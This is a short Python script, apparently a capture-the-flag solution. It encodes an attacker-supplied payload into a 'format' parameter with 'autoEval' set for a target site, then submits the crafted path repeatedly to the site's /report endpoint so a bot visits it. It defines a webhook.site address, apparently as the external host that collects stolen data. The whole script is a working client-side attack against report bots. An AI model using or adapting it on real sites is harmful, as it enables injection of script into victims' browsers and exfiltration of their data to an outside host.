import requests, urllib.parse, sys, time
BASE="https://polynomial.secso.cc"
WB="https://webhook.site/<webhook-token>"
payload = sys.argv[1]
qs=urllib.parse.urlencode({"x":"1","y":"2","formula":"x+y","format":payload,"autoEval":"1"})
path="/?"+qs
print("PATH:", path)
for attempt in range(6):
    r=requests.post(BASE+"/report", data={"url":path}, timeout=25)
    print("REPORT:", r.status_code, r.text.strip()[:120])
    if r.status_code==202: break
    time.sleep(6)
